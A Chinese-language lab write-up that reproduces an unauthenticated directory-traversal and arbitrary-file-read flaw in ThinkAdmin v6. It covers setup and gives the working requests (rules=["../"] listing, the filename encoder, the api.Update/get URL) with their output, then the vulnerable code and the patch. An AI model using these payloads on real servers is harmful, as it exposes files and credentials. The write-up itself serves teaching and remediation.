> 本文由 东塔网络安全学院学员---景同学 投稿。

## 环境搭建

phpstudy2018+ThinkAdmin v6.0.3

  

 **ThinkAdmin版本 ≤ 2020.08.03.01**

https://github.com/zoujingli/ThinkAdmin/tree/a57c3a9373bc89f5eaa4142d047481a898b5757e

![](https://image.3001.net/images/20201203/1606963525_5fc851458a52e5de867d5.png!small)

  

  

  

Composer命令

\1. 安装Composer命令，phpstudy中PHP设置成7.1或以上版本，并把对应的文件夹放入环境变量path中

![](https://image.3001.net/images/20201203/1606963546_5fc8515a7c95c995dd23b.jpg!small)

\2.
在phpstudy服务器中打开php.ini文件，找到extension=php_openssl.dll前面的分号去掉，意思是打开ssl扩展，目的是为了能在cmd命令中能进行访问

![](https://image.3001.net/images/20201203/1606963630_5fc851aeed91c985b3f61.jpg!small)

\3. 安装composer.phar，找到下载内容的地方，去下载当前最新版本的composer.phar，双击安装，不用勾选

下载地址https://getcomposer.org/Composer-Setup.exe

![](https://image.3001.net/images/20201203/1606963662_5fc851ce9ef6517ef07fc.jpg!small)

\4. 配置环境变量后自动选择了

![](https://image.3001.net/images/20201203/1606963757_5fc8522dd29e9f2fa290a.jpg!small)

然后一直下一步，安装完成

![](https://image.3001.net/images/20201203/1606963767_5fc852377af59d7f7b3ee.jpg!small)

\5. 安装完成后在cmd命令行输入composer查看是否安装成功

![](https://image.3001.net/images/20201203/1606963786_5fc8524aeeb41dcfbc9f0.jpg!small)

\6. 设置阿里云 Composer 代理

由于国内访问Composer比较慢，建议设置阿里云Composer镜像，运行如下命令设置阿里云代理

composer config -g repo.packagist composer https://mirrors.aliyun.com/composer

![](https://image.3001.net/images/20201203/1606963802_5fc8525a2bfe06d8408ee.jpg!small)

\7. 搜索下载ThinkAdminV6的漏洞版本到本地

![](https://image.3001.net/images/20201203/1606963877_5fc852a5c5bc420296a77.jpg!small)

\8. 进入ThinkAdmin目录进行安装

composer install

![](https://image.3001.net/images/20201203/1606963900_5fc852bc1866ad57b9236.jpg!small)

\9. 然后进config/database.php目录下修改配置文件，需要创建一个数据库

![](https://image.3001.net/images/20201203/1606963919_5fc852cf33a0100c88a6f.jpg!small)

修改数据库连接所用的账号密码 root/root

  

# 导入数据库

要将 thinkadmin 安装包里的 admin_v6.sql 文件导入到数据库

![](https://image.3001.net/images/20201203/1606963950_5fc852ee63687815b468d.png!small)

  

  

 **快速新建数据库**

![](https://image.3001.net/images/20201203/1606963965_5fc852fdd6be754606684.png!small)

  

数据库名：admin_v6

  

 **常用source 命令**

进入mysql数据库控制台,

如mysql -u root -p

mysql>use 数据库

然后使用source命令,后面参数为脚本文件(如这里用到的.sql)

mysql>source d:wcnc_db.sql

  

  

  

![](https://image.3001.net/images/20201203/1606963985_5fc853110b87d67c2ecef.png!small)

  

  

成功导入

![](https://image.3001.net/images/20201203/1606963992_5fc853189881ac98a6279.png!small)

  

  

\10. php进行运行 php think run

![](https://image.3001.net/images/20201203/1606964012_5fc8532c7f017aeed70c4.jpg!small)

http://ip:8000打开页面

![](https://image.3001.net/images/20201203/1606964021_5fc85335eab65e1eb8478.jpg!small)

  

  

# 漏洞复现

目录遍历/任意文件读取

  

### 目录遍历

可以在浏览器直接构造，也可以burp抓包改包

![](https://image.3001.net/images/20201203/1606964040_5fc85348799fef2ce1fc6.png!small)

  

  

①使用burp抓取首页的包，发送到Repeater模块构造数据包获取目录

②在Repeater模块中把GET修改成POST，url后添加 ?s=admin/api.Update/node

在下面输入rules=%5b%22%2f%22%5d //rules=["/"]

③点击"Send"发送，可以看到返回包中带有目录列表了

![](https://image.3001.net/images/20201203/1606964108_5fc8538cd341fef685b1a.png!small)

  

注：没有返回列表，是因为抓包时不是第一次加载页面，Content-Type字段被替换成为Cache-Control，虽然200但是列表内容为空。

  

![](https://image.3001.net/images/20201203/1606964133_5fc853a5939f0ca26af48.png!small)

  

抓第一次加载页面时的包就没问题

  

 **返回结果**

rules=["/"]会遍历 E:\phpstudy2018\PHPTutorial\WWW\ThinkAdmin6 下所有文件

![](https://image.3001.net/images/20201203/1606964146_5fc853b21b9f1f00646c3.png!small)

  

  

HTTP/1.1 200 OKHost: 192.168.80.111:8000Date: Mon, 30 Nov 2020 10:32:39
+0800Connection: closeX-Powered-By: PHP/7.2.1Content-Type:application/json;
charset=utf-8Set-Cookie: think_lang=zh-cn; path=/Set-Cookie:
PHPSESSID=8a43a78b3ebd325158a78608ac57107a;
path=/{"code":1,"info":"获取文件列表成功！","data":{"rules":["\/"],"ignore":[],"list":[{"name":"\/admin_v6.sql","hash":"a6add0e2aab0e7d45f1ef35ad7846c52"},{"name":"\/app\/admin\/controller\/Auth.php","hash":"9a254f39ccdb4e334d48a8596d4ced57"},{"name":"\/app\/admin\/controller\/Config.php","hash":"09a65b23959905b7ea511e61b75d9626"},{"name":"\/app\/admin\/controller\/Index.php","hash":"da3736920e43b33e18e0ba72407c8588"},{"name":"\/app\/admin\/controller\/Login.php","hash":"c1820e476b786a793a48ff893bf8ed3c"},{"name":"\/app\/admin\/controller\/Menu.php","hash":"d278f7948bfbe005987c16d18d2f49cb"},{"name":"\/app\/admin\/controller\/Oplog.php","hash":"7340a732685f2d4e91c01b07aa3efc4d"},{"name":"\/app\/admin\/controller\/Queue.php","hash":"88ca8b37cb205adbbf771878836366be"},{"name":"\/app\/admin\/controller\/User.php","hash":"52c893ed2f2390e6a46ca3d0fcee59da"},{"name":"\/app\/admin\/controller\/api\/Plugs.php","hash":"db98179054e8fe3a051f97901ea9ff2b"},/*省略一万行*/{"name":"\/vendor\/zoujingli\/wechat-developer\/composer.json","hash":"7db3f4ea9c17c21174c665b22992e97a"},{"name":"\/vendor\/zoujingli\/wechat-developer\/include.php","hash":"1434ae58cf94166d7097fe29ba0d42da"},{"name":"\/vendor\/zoujingli\/wechat-developer\/readme.md","hash":"5dc2765147e9aff90a838578a1dd8083"},{"name":"\/启动须知.txt","hash":"263d4e9a08fbab5ac55e78cf537acb6f"}]}}

rules=["../"]会遍历 E:\phpstudy2018\PHPTutorial\WWW 下所有文件

rules=["../../"]会遍历 E:\phpstudy2018\PHPTutorial 下所有文件

rules=["../../../"]会遍历 E:\phpstudy2018 下所有文件

rules=["../../../../"]会遍历 E:\ 下所有文件

![](https://image.3001.net/images/20201203/1606964273_5fc85431e0adc1bbbeec8.png!small)

  

目录遍历内容超出限制会报错

  

### 任意文件读取

①读取根目录下【启动须知.txt】

![](https://image.3001.net/images/20201203/1606964315_5fc8545b695b7dc1cd0e2.png!small)

  

  

②在使用加密函数对文件名进行加密，等下传参要用

<?php function encode($content) { //加密正常文件名 //list($chars, $length) = ['',
strlen($string = iconv('UTF-8', 'GBK//TRANSLIT', $content))]; //加密中文文件名
list($chars, $length) = ['', strlen($string = iconv('UTF-8', 'GB2312',
$content))]; for ($i = 0; $i < $length; $i++) $chars .=
str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0); return $chars;
}$content="启动须知.txt";echo encode($content);?>

在虚拟机运行

![](https://image.3001.net/images/20201203/1606964376_5fc85498cd4927ef7aa7c.png!small)

  

在线运行

![](https://image.3001.net/images/20201203/1606964394_5fc854aa9d17328ad45f2.png!small)

  

5i6s524v5s6j5y4q1a383c38

  

③访问下面链接即可读取到文件内容

http://192.168.80.111:8000/admin.html?s=admin/api.Update/get/encode/5i6s524v5s6j5y4q1a383c38

![](https://image.3001.net/images/20201203/1606964406_5fc854b6d461a7e84c053.png!small)

  

base64解密得到文件内容

![](https://image.3001.net/images/20201203/1606964421_5fc854c56b4d9ccdd72f3.png!small)

  

  

  

# 漏洞原因

由于Update.php这个文件中的函数方法没有授权导致的

### Update.php

E:\phpstudy2018\PHPTutorial\WWW\ThinkAdmin6\app\admin\controller\api\Update.php

<?php//
+----------------------------------------------------------------------// |
ThinkAdmin//
+----------------------------------------------------------------------// |
版权所有 2014~2020 广州楚才信息科技有限公司 [ http://www.cuci.cc ]//
+----------------------------------------------------------------------// |
官方网站: https://thinkadmin.top//
+----------------------------------------------------------------------// |
开源协议 ( https://mit-license.org )//
+----------------------------------------------------------------------// |
gitee 代码仓库：https://gitee.com/zoujingli/ThinkAdmin// | github
代码仓库：https://github.com/zoujingli/ThinkAdmin//
+----------------------------------------------------------------------namespace
app\admin\controller\api;use think\admin\Controller;use
think\admin\service\InstallService;/** * 安装服务端支持 * Class Update * @package
app\admin\controller\api */class Update extends Controller{ /** * 读取文件内容 */
public function get() { if (file_exists($file = $this->app->getRootPath() .
decode(input('encode', '0')))) { $this->success('读取文件成功！', ['content' =>
base64_encode(file_get_contents($file))]); } else { $this->error('读取文件内容失败！');
} } /** * 读取文件列表 */ public function node() { $this->success('获取文件列表成功！',
InstallService::instance()->getList( json_decode($this->request->post('rules',
'[]', ''), true), json_decode($this->request->post('ignore', '[]', ''), true)
)); }}

  

# 修复方式

1.升级到2020.08.03.01之后的版本

2.使用官方的临时修复方案

https://github.com/zoujingli/ThinkAdmin/issues/244

  

